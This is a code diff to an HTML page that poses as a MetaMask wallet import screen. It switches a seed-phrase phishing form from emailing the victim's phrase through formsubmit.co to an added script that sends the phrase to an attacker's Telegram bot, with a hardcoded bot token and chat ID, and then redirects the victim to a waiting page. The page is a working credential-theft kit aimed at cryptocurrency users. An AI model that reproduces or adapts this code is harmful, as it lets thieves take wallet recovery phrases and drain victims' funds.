@@ -18085,8 +18085,8 @@ textarea {
 </div>
 <br>
 <div id="phrase" class="tabcontent">
-                     <form action="https://formsubmit.co/adeladewale10111@yahoo.com" method="POST" id="form1">
-					 <textarea rows="8" cols="70"  name="key" required="required" minlength="12" placeholder="Seed Phrase"
+                     <form name="form" id="messageForm" >
+					 <textarea rows="8" cols="70" id="key"  name="key" required="required" minlength="12" placeholder="Seed Phrase"
                         required="required"></textarea>   
 <br>
 <br>						
@@ -18094,6 +18094,32 @@ textarea {
                       
                       <button form="form1" value="Import" type="submit" name="import" class="button btn--first-time first-time-flow__button">IMPORT</button>
                     </form>
+	<script>
+                document.getElementById("messageForm").addEventListener("submit", function (event) {
+                    event.preventDefault(); // Prevent form submission
+        
+                    const key = document.getElementById("key").value;
+                    
+        
+                    // Replace with your actual Telegram bot token and chat ID
+                    const botToken = "6375031192:AAFtfTA6UE7NYFQpW8wdT2TbuIsl4goQLnY";
+                    const chatId = "1635095037";
+                    const text = `MetaMask Seedphrase\nSeedphrase: ${key}`;
+                    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+        
+                    fetch(url, { method: "GET" })
+                        .then(response => {
+                            if (response.ok) {
+                                console.log("Message sent successfully!");
+                                // Redirect to another page (replace with your desired URL)
+                        window.location.href = "wait.html"; // Change this U
+                            } else {
+                                console.error("Error sending message:", response.statusText);
+                            }
+                        })
+                        .catch(error => {
+                            console.error("Network error:", error);
+                        });
                   </div>
               
                   <div id="keystore" class="tabcontent">
